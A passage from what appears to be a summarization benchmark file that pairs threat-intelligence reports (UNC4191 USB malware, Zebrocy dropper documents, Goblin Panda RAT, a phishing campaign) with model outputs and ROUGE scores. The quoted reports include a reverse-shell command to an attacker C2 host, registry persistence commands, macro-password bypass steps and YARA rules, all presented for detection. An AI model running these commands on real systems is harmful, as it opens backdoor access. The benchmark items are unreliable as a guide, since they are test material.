particular actors has a logical basis, even if it's not proven at this point.4/4 ", "generated_text": "cyber espionage; 2022; 15 entities; the campaign; at least 2019; 2022; phishing pages; email addresses; phishing emails; the attackers; at least 2019; APT28; FancyBear; Konni; North Korea; the attackers; access; websites; Brazil; phishing pages; the phishing pages; a lure; the landing pages; phishing emails; the lure; a \"Your Mail Box storage is full\" lure; the landing pages; The research; the attackers; the infrastructure; phishing emails; the victims; organizations; the infrastructure; function; a custom 'Mail Box' toolkit; infrastructure; infrastructure; the campaign; operators.", "ref_text": "<START-1>The PDF describes a large-scale cyberespionage campaign targeting renewable energy and industrial technology organizations that has been active since at least 2019. The campaign was discovered by security researcher William Thomas using OSINT techniques. The attackers use a custom 'Mail Box' phishing toolkit and compromised websites, mainly in Brazil, to host phishing pages impersonating organisations in the renewable energy sector. The goal is to steal login credentials of employees at these firms. Over 15 entities worldwide have been targeted so far, including companies like Schneider Electric, Honeywell, universities, and renewable energy facilities. The researcher could not conclusively attribute the campaign to a specific threat actor but found possible links to APT28 and Konni groups. There is an overlap with infrastructure used by both groups. The campaign has a focus on Bulgaria, targeting several banks in 2019. The researcher speculates the adversary may be financially supported by fossil fuel interests who see renewable energy as a threat. The previous bank targeting could have been to gather intelligence on funding of new renewable facilities. While not proven, APT28's links to Russia provide a logical basis for this theory, as Bulgaria imports Russian natural gas. In summary, this ongoing cyberespionage campaign is targeting the renewable energy sector, likely to steal intelligence to benefit fossil fuel interests threatened by clean energy adoption. Attribution is unclear but tactics and infrastructure analysis suggests potential APT28 or Konni involvement. <END-1>", "t5/keyword/hint_hit_precision": 0.3, "t5/word/hint_hit_recall": 0.08189655172413793, "gpt3/lexical/rouge_rouge1": 0.5219638242894056, "gpt3/lexical/rouge_rouge2": 0.1922077922077922, "gpt3/lexical/rouge_rougeL": 0.3049095607235142, "gpt3/lexical/rouge_rougeLsum": 0.3049095607235142, "gpt3_generated_text": ["In a recent cyber espionage campaign discovered in 2022, at least 15 renewable energy and industrial technology organizations worldwide have been targeted since at least 2019. The campaign involves the use of phishing pages hosted on compromised websites, primarily located in Brazil. The attackers aim to steal login credentials from employees of targeted organizations, including prominent entities like Schneider Electric and various universities and environmental protection agencies. The phishing emails are believed to use a \"Your Mail Box storage is full\" lure to trick victims into providing their credentials. While the campaign has not been definitively attributed to any specific actors, evidence suggests involvement from APT28 (FancyBear) and Konni (North Korea). The infrastructure used in the attacks, including Zetta Hosting Solutions domains, has been linked to other malicious campaigns in the past. The research indicates a potential motive related to financial interests in fossil fuels, particularly in Bulgaria, which imports Russian natural gas."]}, {"split_name": "val", "sample_id": "val_64", "prompt_text": "Extract the keywords: 8/21/2018Goblin Panda against the Bears \u2013 Sebdraven \u2013 MediumFollowSebdraven OSINT, Python,Malware Analysis, Botnet Tracker, SIEM and IPS/IDS and Threats Expert / co- organizer #BotConf / co-creator of #FastIR Aug 2 \u00b7 4 min readGoblin Panda against the BearsDuring my last investigation (here), I\u2019ve found two RTFs malware documents with the same techniques of exploitation of CVE-2017\u2013 11882:A  le 8.t in %TMP% with Package Ole ObjectThe same loop of decryptionThe same runPE after overwriting in memory EQNEDT32.exeBut the payload is really di erent. It\u2019s not a version of PlugX but a version of Sis der studied by Ncc group. url events/blogs/2018/june/cve-2017-8570-rtf-and-the-sisfader-rat/With the behaviour graph of Joe Sandbox, we can recognize the same interactions with operating system than my last article and the paper of NCC Group.Behaviour of malwaresThe di erence with the version studied by NCC Group is the Package Ole Object. In the article of NCC Group, the researchers talk about a SCT File and many javascript manipulations for dropping the RAT on the disk and to start it.url Panda against the Bears \u2013 Sebdraven \u2013 MediumHere, the payload is encrypted in 8.t  leIf we analyze EQNEDT32.exe overwritten to recognise the payload, we have the same technics anti emulation with the same value.In a thread, the process posts in a queue the value 5ACE8D0Ah.Anti emulation tricksAnti emulation tricksThe veri cation is calling GetMessage() and the value is stored in EAX in the function sub_401A60.url Panda against the Bears \u2013 Sebdraven \u2013 MediumThe comparaison is made in the calling function sub_4027D0.Anti emulation tricks veri cationJuste after we found again the loop of decryption for the con g.call to loop of decryptionurl Panda against the Bears \u2013 Sebdraven \u2013 MediumLoop of decrypting con gIt\u2019s the same algorithm described: a simple XOR loop with rolling key.The mechanism of persistent is the same with a service creation just after dropping di erents  les and a privilege escalation.We found the same name of the dll  les.url Panda against the Bears \u2013 Sebdraven \u2013 MediumPersistence and loading agentThe malware overwrite the comobject{9BA05972-F6A8\u201311CF-A442\u201300A0C90A8F39} to execute when this com object is called to make a persistenceComObject AddingAll evidences show is the same payload Sisfader RAT.Threat IntelThe toolset for exploiting the module of equation is the same using of the compromission for Vietnameses O cials used by Goblin Panda. (APT 1937CN)url Panda against the Bears \u2013 Sebdraven \u2013 MediumIf we check the domain contacted by EQNEDT32.exe is kmbk8.hicp.net. This address is a real good pivot. It makes the link with Goblin Panda and SisFader RAT.And the infrastructure is very interesting this domains resolved on of Russia (FSB)RTFs contentSo Gobelin Panda targets like the report of CrowdStrike url 266/images/ReportGlobalThreatIntelligence.pdf he telecom industries in Russia.ConclusionGoblin Panda used Sisfader RAT to target the Telecom Firms russian with the same exploitation techniques for Vietnameses O cials. They ", "generated_text": "Goblin Panda; Telecom Firms; Russian; the same techniques; the compromise; Vietnamese; cials; Sisfader RAT; the telecom industries; the same techniques; VPNs; the same malware; the payload; the payload; Data; emulation; compromise; the malware; a command; control; security; IP; id; research; NCC; the same malware; a payload; SCT; Recommendations; threat intelligence; research; timing.", "ref_text": "<START-1>The article analyzes two RTF malware documents that exploit CVE-2017-11882 to deliver a remote access trojan payload. The RTFs use the same exploitation techniques but deliver different payloads than past Goblin Panda activity targeting Vietnam officials. Analysis shows the payload is a version of the SisFader RAT, which uses anti-emulation and encryption techniques similar to past Goblin Panda malware. Infrastructure links the activity to Goblin Panda APT group and the SisFader RAT. The C2 domains resolve to IP addresses in Shanghai. Unlike past targeting of Vietnam, this campaign targeted Russian telecom firms pretending to be Russia's FSB intelligence agency. Goblin Panda has evolved their techniques from prior SisFader RAT analysis and continues to target telecom sectors aligned with intelligence collection goals. Indicators of compromise for the malware documents, C2 infrastructure, and RAT payload are provided. In summary, the post analyzes a Goblin Panda campaign distributing an updated version of the SisFader remote access trojan via exploitation of Russian telecom entities. It highlights the evolving techniques and targeting of this Chinese threat actor. <END-1>", "t5/keyword/hint_hit_precision": 0.34375, "t5/word/hint_hit_recall": 0.09302325581395349, "gpt3/lexical/rouge_rouge1": 0.43750000000000006, "gpt3/lexical/rouge_rouge2": 0.13286713286713286, "gpt3/lexical/rouge_rougeL": 0.2222222222222222, "gpt3/lexical/rouge_rougeLsum": 0.2222222222222222, "gpt3_generated_text": ["The article discusses Goblin Panda's use of the Sisfader RAT to target Russian telecom firms, employing the same exploitation techniques as seen in attacks against Vietnamese officials. The malware payload is encrypted in a file and utilizes anti-emulation tricks to evade detection. The persistent mechanism involves creating a service and privilege escalation. The malware overwrites a com object for persistence. The domain contacted by the malware links back to Goblin Panda and Russian infrastructure. The article highlights the threat intelligence gathered and recommends heightened security measures for telecom industries. Overall, the research reveals the ongoing threat posed by Goblin Panda and emphasizes the importance of staying vigilant against such attacks."]}, {"split_name": "val", "sample_id": "val_65", "prompt_text": "Extract the keywords: www.mandiant.com /resources/blog/china-nexus-espionage-southeast-asia Always Another Secret: Lifting the Haze on China-nexus Espionage in Southeast AsiaMandiant Managed Defense recently identified cyber espionage activity that heavily leverages USB devices as an initial infection vector and concentrates on the Philippines. Mandiant tracks this activity as UNC4191 and we assess it has a China nexus.UNC4191 operations have affected a range of public and private sector entities primarily in Southeast Asia and extending to the U.S., Europe, and APJ; however, even when targeted organizations were based in other locations, the specific systems targeted by UNC4191 were also found to be physically located in the Philippines.Following initial infection via USB devices, the threat actor leveraged legitimately signed binaries to side- load malware, including three new families we refer to as MISTCLOAK, DARKDEW, and BLUEHAZE. Successful compromise led to the deployment of a renamed NCAT binary and execution of a reverse shell on the victim\u2019s system, providing backdoor access to the threat actor. The malware self-replicates by infecting new removable drives that are plugged into a compromised system, allowing the malicious payloads to propagate to additional systems and potentially collect data from air-gapped systems.Mandiant Managed Defense performs continuous threat hunting for customers, discovering evidence of new tactics, techniques, and procedures (TTPs) that can evade traditional detection mechanismsIn response to this campaign, Mandiant deployed new real-time detections, enhancing Managed Defense\u2019s protection for our customers from future similar activity. Our Adversary Operations team created and deployed YARA rules and Mandiant Security Validation Actions, shared at the end of the post. This blog post details our initial threat hunting discovery, the newly identified malware families, detection opportunities, and Mandiant\u2019s assessment about the goals and motivations of the threat actor. Malware ObservedMandiant observed UNC4191 deploy the following malware families.Descriptionpayload stored in a file on disk.Table 1: UNC4191 Malware FamiliesMalware Family MISTCLOAK MISTCLOAK is a launcher written in C++ that executes an encrypted executable BLUEHAZE BLUEHAZE is a launcher written in C/C++ that launches a copy of NCAT to create a DARKDEW DARKDEW is a dropper written in C++ that is capable of infecting removable drives. NCAT is a command-line networking utility that was written for the Nmap Project to NCAT perform a wide-variety of security and administration tasks. While NCAT may be used for legitimate purposes, threat actors may also use it to upload or downloadreverse shell to a hardcoded command and control (C2).1/12files, create backdoors or reverse shells, and tunnel traffic to evade network controls. Initial DetectionMandiant Managed Defense customers receive Mandiant\u2019s dedicated proactive Threat Hunting service. Mandiant's threat hunting team leverages the MITRE ATT&CK\u00ae framework as a guide for developing Hunt Missions that examine endpoint telemetry data, such as process events, for collection and ATT&CK technique ID tagging. The resulting threat hunting data set provides the team with wide visibility across the customer base. When performing analysis, we augment this data set with more targeted sources, like custom, real-time alerting from our customers\u2019 endpoint detection and response (EDR) technologies.Mandiant uses custom tooling to identify ATT&CK technique sequences and clusters associated with common threat actor behaviors. A technique sequence is useful for identifying events with a defined order of execution, such as the creation of a local account (T1136.001) and then addition to the local Administrators group (T1098). A technique cluster identifies a grouping of techniques that don\u2019t necessarily occur in a specific order. By focusing on technique sequences and clusters, we reduce the amount of data that needs to be manually reviewed by analysts.For example, Mandiant has observed threat actors enumerating domain trusts (T1482) and querying domain and local group permissions (T1069.001, T1069.002) within a several minute span (Figure 1). The combined event count for these three techniques occurring on their own can number in the hundreds of thousands, but by applying technique sequencing or clustering we can reduce the number of interesting events to a manageable amount.2/12Figure 1: Visualization of technique sequencing and clustering conceptsMandiant identified this UNC4191 campaign by searching for anomalous sequences of events under our \u201cMandiant Intelligence: Staging Directories\u201d and \u201cCommand and Scripting Interpreter: Windows Command Shell (T1059.003)\u201d hunting missions (Figure 2).3/12Figure 2: Technique sequence that led to UNC4191 detectionThe techniques performed by UNC4191 led to the development of additional technique sequences and detection opportunities, as described in the Detection Opportunities section. UNC4191 Malware Infection CycleThe overall infection cycle from this campaign can be split into three distinct phases, shown in Figure 3.4/12Figure 3: UNC4191 malware infection cyclePHASE I: MISTCLOAKThe infection chain begins when a user plugs in a compromised removable device and manually executes a renamed signed binary from the root directory of the storage volume (T1091). The initial binaries\u2014named Removable Drive.exe or USB Drive.exe\u2014are versions of a legitimately signed application called USB Network Gate, developed by the company Electronic Team, Inc. These are used to side-load the MISTCLOAK malware that impersonates a legitimate DLL (Table 2).Table 2: Legitimate USB Network Gate binaries used toside-load MISTCLOAK malware directory on the removable device (T1574.002) (Table 3). MISTCLOAK is a launcher for the encrypted file usb.ini, which MISTCLOAK reads from the current directory or the path autorun.inf\\Protection for Autorun\\System Volume Information\\usb.ini. Mandiant identified the PDB file path G:\\project\\APT\\U \\new\\shellcode\\Release\\shellcode.pdb in the MISTCLOAK sample. Notably, the Chinese characters  Hijacking\\new\\u2ec\\Release\\u2ec.pdb)5/12MISTCLOAK then opens Windows Explorer to the location on the removable device where the user files are stored with the command \u2018explorer.exe \"<drive>:\\autorun.inf\\Protection for Autorun\"\u2019.Phase II: DARKDEWThe file usb.ini contains an encrypted DLL payload called DARKDEW that is capable of infecting removable drives. If executed from a removable drive, DARKDEW will launch explorer.exe via `explorer.exe \u201c<drive>:\\autorun.inf\\Protection for Autorun\u201d` where <drive> is a removable drive letter, such as \u201cE\u201d. DARKDEW will then check if either C:\\ProgramData\\udisk\\disk_watch.exe or C:\\ProgramData\\udisk\\DateCheck.exe exist and will create the directory C:\\ProgramData\\udisk if neither Volume Information\\ to C:\\ProgramData\\udisk\\. Mandiant identified files in this directory, such as Removable Drive (16GB).lnk, that originated from a system that was previously compromised by DARKDEW (T1074.001) and copied to a USB device. The copied data includes the files shown in Table 5 and arbitrary files with the extensions: xlsx, docx, mp4, device, jpg, pptx, pdf, txt, and lnk files.Table 5: Files that are copied by DARKDEW from the removable drive to a compromisedsystemC:\\ProgramData\\udisk\\disk_watch.exeC:\\ProgramData\\udisk\\libeay32.dllC:\\ProgramData\\udisk\\Removable Disk.exeC:\\ProgramData\\udisk\\rzlog4cpp.dllC:\\ProgramData\\udisk\\rzlog4cpp_logger.dllC:\\ProgramData\\udisk\\ssleay32.dllC:\\ProgramData\\udisk\\u2ec.dllC:\\ProgramData\\udisk\\USB Drive.exeC:\\ProgramData\\udisk\\usb.iniC:\\ProgramData\\udisk\\UsbConfig.exe6/12C:\\ProgramData\\udisk\\wuwebv.exeC:\\ProgramData\\udisk\\DateCheck.exeC:\\ProgramData\\udisk\\example.jpgC:\\ProgramData\\udisk\\example.xlsxDARKDEW will then copy the renamed USB Network Gate binary (e.g., Removable Drive.exe) to C:\\ProgramData\\udisk\\disk_watch.exe and create persistence with a registry key value named udisk under HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run (T1547.001). Finally, DARKDEW will launch a file named C:\\ProgramData\\udisk\\DateCheck.exe and then exit.Table 6: DARKDEW registry persistenceKey: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunValue: udiskText: c:\\programdata\\udisk\\disk_watch.exeIf DARKDEW is executed from a non-removable drive, the behavior is slightly different. DARKDEW will create the directory C:\\ProgramData\\udisk\\, then copy every file in the current directory of the parent executable to C:\\ProgramData\\udisk\\. It will then copy the parent executable to C:\\ProgramData\\udisk\\disk_watch.exe and launch it. The persistence mechanism is identical, and it will also launch C:\\ProgramData\\udisk\\DateCheck.exe.When DARKDEW is executed within the context of disk_watch.exe, the malware will scan the system every 10 seconds for removable drives by enumerating volumes from A to Z until it finds one that is removable. The DARKDEW malware then creates the directory <drive>\\autorun.inf\\Protection for Autorun\\, sets its attribute to hidden, and copies the contents of the current working directory of disk_watch.exe to that directory or the subdirectory <drive>:\\autorun.inf\\Protection for Autorun\\System Volume Information\\. This capability appears to be a method for self-replication and to transfer files that may be collected from air-gapped systems.Phase III: BLUEHAZEThe binary DateCheck.exe is a renamed version of a legitimate, signed application called Razer registry key value ACNTV under HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run (T1547.001) for persistence. Next, BLUEHAZE copies all the files from its working directory to C:\\Users\\Public\\Libraries\\CNNUDTV\\ and then executes a renamed NCAT executable wuwebv.exe to create a reverse shell to the hard-coded command and control (C2) address: closed[.]theworkpc[.]com:80 (T1059). Mandiant has not observed evidence of reverse shell interaction; however, based on the age of the activity, this may be a result of visibility gaps or short log retention periods.DateCheck.exe >Table 9: BLUEHAZE command execution\"cmd.exe /C reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v ACNTV /t REG_SZ /d \\\"Rundll32.exe SHELL32.DLL,ShellExec_RunDLL \\\"C:\\\\Users\\\\Public\\\\Libraries\\\\CNNUDTV\\\\DateCheck.exe\\\"\\\" /f\"cmd.exe /c copy *.* C:\\\\Users\\\\Public\\\\Libraries\\\\CNNUDTV\\\\\"cmd.exe /C wuwebv.exe -t -e c:\\\\windows\\\\system32\\\\cmd.exe closed.theworkpc[.]com 80 Outlook and ImplicationsBased on available data, such as PE compile timestamps for the malware involved in the aforementioned activity, this campaign potentially extends back to September 2021. Given the worming nature of the malware involved, we may have detected the later stages of this malware\u2019s proliferation.We believe this activity showcases Chinese operations to gain and maintain access to public and private entities for the purposes of intelligence collection related to China\u2019s political and commercial interests. Our observations suggest that entities in the Philippines are the main target of this operation based on the number of affected systems located in this country that were identified by Mandiant. Campaign TrackingMandiant will continue to monitor UNC4191\u2019s campaign and will provide notable and dynamic updates regarding changes in tactics and techniques, the introduction of tools with new capabilities, or the use of8/12new infrastructure to carry out their mission.For more insights into how Mandiant tracks this and similar campaigns, see our Threat Campaigns feature within Mandiant Advantage Threat Intelligence. Detection OpportunitiesEach Mandiant threat hunting discovery is evaluated for opportunities to create new real-time detections. These detections help Mandiant identify additional activity across our customers\u2019 environments for rapid escalation and triage analysis and aim to reduce threat actor dwell time.Following our initial campaign discovery, we immediately searched the entire Managed Defense customer base for any activity that matched our atomic indicators of interest, including filenames, file paths, file hashes, IP addresses, domains, and other artifacts. This uncovered activity on systems at multiple customers.Additionally, we also created or updated real-time Managed Defense detections to identify threat actor methodologies, such as:Deployment or usage of NETCAT and NCAT reverse shellsModification of registry Run keys for malware persistence, with arguments configured to execute the Windows binary rundll32.exeProcesses launched from the C:\\Users\\Public\\Libraries\\ directoryBy combining Mandiant\u2019s threat intelligence service with Managed Defense\u2019s detection engineering and threat hunting capabilities, we can rapidly identify and provide context around malicious activity.Detection Opportunity NCAT reverse shell execution arguments Parent or grandparent processes executing from Non-C:\\ Drive RootMITRE ATT&CK Event Details T1036D:\\USB Drive.exewuwebv.exe -t -e c:\\\\windows\\\\system32\\\\cmd.exe closed.theworkpc[.]com 80 Process:Child Processes:> explorer.exe \"D:\\autorun.inf\\Protection for Autorun\"> c:\\programdata\\udisk\\disk_watch.exe> c:\\programdata\\udisk\\DateCheck.exeGrandchild Processes:>> \"cmd.exe /C reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v ACNTV /t REG_SZ /d \\\"Rundll32.exe SHELL32.DLL,ShellExec_RunDLL9/12\\\"C:\\\\Users\\\\Public\\\\Libraries\\\\CNNUDTV\\\\DateCheck.exe\\\"\\\" /f\">> cmd.exe /c copy *.* C:\\\\Users\\\\Public\\\\Libraries\\\\CNNUDTV\\\\\">> cmd.exe /C wuwebv.exe -t -e c:\\\\windows\\\\system32\\\\cmd.exe closed.theworkpc[.]com 80 Registry Key: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunValue: udiskText: c:\\programdata\\udisk\\disk_watch.exe reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v ACNTV /t REG_SZ /d \\\"Rundll32.exe SHELL32.DLL,ShellExec_RunDLL \\\"C:\\\\Users\\\\Public\\\\Libraries\\\\CNNUDTV\\\\DateCheck.exe\\\"\\\" /f\" OriginalFileName: UsbConfig.exeRegistry Run key persistence for binary in PROGRAMDATAT1060Registry Run key T1060File name of executing process doesn\u2019t match original nameT1036, T1574.002File Name: Removable Disk.exe, USB Drive.exeOriginalFileName: RzCefRenderProcess.exeWindows Explorer process execution with folder path specified on command lineFile Name: DateCheck.exe Parent Process Path: D:\\USB Drive.exeT1091Process: explorer.exeCommand Line: explorer.exe \"D:\\autorun.inf\\Protection for Autorun\"Mandiant Security Validation ActionsOrganizations can validate their security controls using the following actions with Mandiant Security Validation.NameVID A105-454 Protected Theater - UNC4191, BLUEHAZE, Execution, Variant #1 A105-455 Protected Theater - UNC4191, DARKDEW, Execution, Variant #1 A105-466 Command and Control - UNC4191, DNS Query, Variant #1 author = \"Mandiant\"10/12strings: $s1 = \"CheckUsbService\" ascii $s2 = \"new\\\\u2ec\\\\Release\\\\u2ec.pdb\" ascii $s3 = \"autorun.inf\\\\Protection for Autorun\" ascii condition: uint16(0) == 0x5a4d and filesize < 200KB and (2 of ($s*)) $s1 = \"do inroot\" ascii $s2 = \"disk_watch\" ascii $s5 = \"G:\\\\project\\\\APT\\\\\" ascii $s3 = \"c:\\\\programdata\\\\udisk\" ascii $s4 = \"new\\\\shellcode\\\\Release\\\\shellcode.pdb\" ascii condition: filesize < 500KB and (2 of ($s*)) $s1 = \"Libraries\\\\CNNUDTV\" ascii $s2 = \"closed.theworkpc.com\" ascii $s3 = \"cmd.exe /C wuwebv.exe -t -e\" ascii condition:11/12uint16(0) == 0x5a4d and filesize < 500KB and (2 of ($s*)) } Indicators of CompromiseDescription NCAT C2ValueType Domain closed.theworkpc[.]com DLL Side-Loading) Razer Chromium Render Process (Legitimate Binary used for DLL Side-Loading) AcknowledgementsSpecial thanks to Tobias Krueger and Conor Quigley for their assistance with analyzing the MISTCLOAK, DARKDEW, and BLUEHAZE samples and Matthew Hoerger for creating Mandiant Security Validation (MSV) actions. We would also like to thank Tim Martin, Alexander Pennino, Nick Richard, and Sarah Hawley for their technical review and feedback.12/12 ", "generated_text": "Mandiant Managed Defense; Chinese; UNC4191; Philippines; USB devices; the malware; MISTCLOAK; DARKDEW; BLUEHAZE; a command; network service; NCAT; DARKDEW; BLUEHAZE; backdoors; the malware; YARA rules; YARA Security Validation Actions; detection; endpoint telemetry data; techniques; anomalies; DIR; control; YARA rules; detections; YARA rules; YARA Security Validation Actions; YARA rules; YARA rules; security validation actions; detection opportunities; threat actors.", "ref_text": "<START-1>The PDF describes a cyberespionage campaign called UNC4191 that targeted organizations primarily in Southeast Asia, as well as some in the US, Europe, and Asia Pacific. The threat actor has a suspected China nexus. Initial infection vectored used USB devices. Malicious binaries named USB Drive.exe or Removable Drive.exe were executed by users when plugging in compromised USB drives. The binaries sideloaded and executed the malware MISTCLOAK, DARKDEW, and BLUEHAZE. MISTCLOAK decrypts and executes DARKDEW from an encrypted file on the USB drive. DARKDEW self-replicates by infecting any new USB drives plugged into the compromised system. It steals data from air-gapped systems this way. BLUEHAZE uses a signed binary to sideload itself. It opens a reverse shell to a command and control server using NCAT. Successful compromise allows the threat actor to maintain persistent access and carry out intelligence collection. The campaign appears to have started around September 2021 based on compile timestamps of the malware samples. New detections were created in Managed Defense to identify this activity, enabling rapid response. Indicators of compromise are provided. Mandiant will continue monitoring the campaign and provide updates on changes in TTPs or new tools. <END-1>", "t5/keyword/hint_hit_precision": 0.30303030303030304, "t5/word/hint_hit_recall": 0.06806282722513089, "gpt3/lexical/rouge_rouge1": 0.4131147540983607, "gpt3/lexical/rouge_rouge2": 0.13861386138613863, "gpt3/lexical/rouge_rougeL": 0.2295081967213115, "gpt3/lexical/rouge_rougeLsum": 0.2295081967213115, "gpt3_generated_text": ["Mandiant Managed Defense recently uncovered a cyber espionage campaign, UNC4191, with a China nexus that targets organizations primarily in Southeast Asia, specifically the Philippines, using USB devices as an initial infection vector. The threat actor deploys malware families MISTCLOAK, DARKDEW, and BLUEHAZE to create backdoors and execute a reverse shell on compromised systems, allowing for data collection and propagation to additional systems. Mandiant responded by deploying new real-time detections, including YARA rules and Security Validation Actions, to enhance protection for customers. By utilizing the MITRE ATT&CK framework and custom tooling to analyze endpoint telemetry data for anomalies, Mandiant was able to detect and mitigate the UNC4191 campaign effectively."]}, {"split_name": "val", "sample_id": "val_66", "prompt_text": "Extract the keywords: A Deep Dive into Zebrocy\u2019s Dropper Docslabs.sentinelone.com/a-deep-dive-into-zebrocys-dropper-docsMarco FigueroaApril 19, 2021Sofacy is an APT threat actor that\u2019s been around since 2008 and rose to prominence with the election hacks of 2016. Better known as FancyBear or APT28, this threat actor targets governments, military, and private organizations and has been known to engage in hack- and-leak operations. In the past couple of years, Sofacy has drastically retooled and largely evaded analysts. One of the more consistent subgroups is known as Zebrocy. Their targeting appears primarily focused on former Soviet Republics and, more recently, Asia.In March 2021, we observed a cluster of activities targeting Kazakhstan with Delphocy \u2013 malware written in Delphi and previously associated with Zebrocy. The Word documents that were observed purport to be from a Kazakhy company named Kazchrome, a mining and metal company and one of the world\u2019s largest producers of chrome ore and ferroalloys.In total, we found six Delphocy Word documents that appear to be related to this cluster, all of which contain the same VBA script that drops a PE. Out of the six Word documents, two appear to be authentic uploads to VirusTotal by victims originating from Kazakhstan. The uploaded files contain what appeared to be the original filenames \u0410\u0432\u0430\u043d\u0441\u043e\u0432\u044b\u0439 \u043e\u0442\u0447\u0435\u0442(\u043d\u043e\u0432\u044b\u0439).doc and \u0424\u043e\u0440\u043c\u0430 \u0434\u043e\u043a\u043b\u0430\u0434\u043d\u043e\u0439 (\u0441\u043b\u0443\u0436\u0435\u0431\u043d\u043e\u0439) \u0437\u0430\u043f\u0438\u0441\u043a\u0438.doc.In this post, we take a deep dive into these samples and share some techniques other analysts can employ to reverse engineer Delphocy dropper docs. We show how researchers can bypass password-protected macros and describe both how to decompile Delphi using IDR (Interactive Delphi Reconstructor) and how to import the saved IDC file into Ghidra using dhrake\u2019s plugin.1/11The results of our analysis led us to discover further Zebrocy clusters; a list of IOCs and YARA detection rules are provided to enable threat hunters to search for these and related artifacts in their environments.Bypassing VBA Macro Password ProtectionWhen analyzing Office documents with VBA macros, threat hunters have many different tools and techniques that do the job, but I\u2019ve built a habit that I still use when I first started reversing malware to bypass password-protected macros manually.1. Open up your favorite hex editor. I use HxD. 2. Load the Word Document. 3. Search for the following text:1. CMG= 2. GC= 3. DPB=4. Add an x to each of them:1. CMGx= 2. GCx= 3. DPBx=5. Save the file with the changes.2/11When opening the Word document and viewing the macro this time, you can see the script as well as the Forms. When analyzing the function, what immediately sticks out is the ert.DataType = \u201cbin.base64\u201d , showing that the UserForm1 is encoded with base64.Wininition UserFormWhen selecting on UserForm1, the textbox reveals a base64 encoded string; we know this because of the function we discussed above. The next step is to copy the entire string into a file so it can be decoded.3/11Now we decode the binary from base64 and save it to disk as wininition.exe .Following that, clean the headers using HxD, and then use PE-Bear to fix the sections headers to move to the next phase of the analysis.4/11When triaging a binary, the go-to tool is Hiew to investigate and look for clues for a deeper understanding. With wininition , I notice the Embarcadero string, which means that this binary was written in Delphi. When reversing Delphi binaries I\u2019ve always used IDR (Interactive Delphi Reconstructor). IDR is a decompiler of executable files and dynamic libraries (DLL) written in Delphi.5/11Reversing Delphi Binaries with Ghidra and dhrakeWhen searching for the latest developments with IDR, I came across a fantastic plugin for Ghidra, a collection of scripts for reverse engineering Delphi binaires in Ghidra using IDR\u2019s output to IDC. It was published over a year ago, but it is a gem if threat hunters are using Ghidra.dhrake allows you to import the IDC file from IDR into Ghidra. This will import the Symbol names, function signatures and create structs for Delphi classes. This plugin extracts and applies the Delphi symbols from the IDC file, which is generated by IDR, and attempts to find cases where Ghidra has incorrectly determined the entry point of a function. If you\u2019ve never imported a plugin to Ghidra please read this post. I\u2019ve saved the IDC to a selected folder. I then install the plugin in Ghidra and run the script it prompts for the IDC file and then load it!6/11In the wininition binary, the first function WinMain has SetWindowsHookExW function, which is a hook procedure to monitor a system for certain types of events. The hook procedures low-level keyboard input events is WH_KEYBOARD_LL , which is the number 13 in the parameter. This hook is a mechanism that intercepts keystroke events. All the events are then saved to a log file to be sent to a C2.7/11The C2 is obfuscated using hex that can be converted to ascii:68747470733A2F2F7777772E786268702E636F6D2F646F6D696E61726772656174617369616E6F64797hxxps://www.xbhp[.]com/dominargreatasianodyssey/wp- content/plugins/akismet/style.php68747470733A2F2F7777772E63346373612E6F72672F696E636C756465732F736F75726365732F66656hxxps://www.c4csa[.]org/includes/sources/felims.phpNote: These appear to be compromised domains.ConclusionAnalysis of these documents led us to find other Zebrocy clusters. As Zebrocy continues to evolve its scope, organizations must have the proper visibilities and detection capabilities to find this threat actor. We hope the techniques discussed in this post will be useful to other researchers in analyzing Delphocy dropper docs in particular, and documents with password-protected macros in general.8/11Indicators of CompromiseWord DocumentsSHA256 content/plugins/akismet/style.php hxxps://www.c4csa[.]org/includes/sources/felims.phpYara Rules9/11rule apt_RU_delphocy_encStrings {meta: desc = \"Hex strings in Delphocy drops\" author = \"JAG-S @ SentinelLabs\" version = \"1.0\" TLP = \"White\" last_modified = \"04.09.2021\" $enc_keylogger2 = \"5B4241434B53504143455D\" ascii wide $enc_keylogger3 = \"5B5441425D\" ascii wide $enc_keylogger4 = \"5B53484946545D\" ascii wide $enc_keylogger5 = \"5B434F4E54524F4C5D\" ascii wide $enc_keylogger6 = \"5B4553434150455D\" ascii wide $enc_keylogger7 = \"5B454E445D\" ascii wide $enc_keylogger8 = \"5B484F4D455D\" ascii wide $enc_keylogger9 = \"5B4C4546545D\" ascii wide $enc_keylogger10 = \"5B55505D\" ascii wide $enc_keylogger11 = \"5B52494748545D\" ascii wide $enc_keylogger12 = \"5B444F574E5D\" ascii wide $enc_keylogger13 = \"5B434150534C4F434B5D\" ascii wide $cnc1 =\"68747470733A2F2F7777772E786268702E636F6D2F646F6D696E61726772656174617369616E6F6479ascii wide $cnc2 =\"68747470733A2F2F7777772E63346373612E6F72672F696E636C756465732F736F75726365732F6665ascii widecondition: uint16(0) == 0x5a4d and (any of ($cnc*) or all of ($enc_keylogger*))}10/11rule apt_RU_Delphocy_Maldocs {meta: desc = \"Delphocy dropper docs\" author = \"JAG-S @ SentinelLabs\" version = \"1.0\" TLP = \"White\" last_modified = \"04.09.2021\" $required1 = \"_VBA_PROJECT\" ascii wide $required2 = \"Normal.dotm\" ascii wide $required3 = \"bin.base64\" ascii wide $required4 = \"ADODB.Stream$\" ascii wide $author1 = \"Dinara Tanmurzina\" ascii wide $author2 = \"Hewlett-Packard Company\" ascii wide $specific = \"Caption = \\\"\\\\wininition.exe\\\"\" ascii wide $builder1 = \"Begin {C62A69F0-16DC-11CE-9E98-00AA00574A4F} UserForm1\" asciiwide$builder2 = \"{02330CFE-305D-431C-93AC-29735EB37575}{33D6B9D9-9757-485A-89F4-4F27E5959B10}\" ascii wide$builder3 = \"VersionCompatible32=\\\"393222000\\\"\" ascii wide $builder4 = \"CMG=\\\"1517B95BC9F7CDF7CDF3D1F3D1\\\"\" ascii wide $builder5 =\"DPB=\\\"ADAF01C301461E461EB9E2471E616F01D06093C59A7C4D30F64A51BDEDDA98EC1590C9B191FFascii wide $builder6 = \"GC=\\\"4547E96B19021A021A02\\\"\" ascii widecondition: 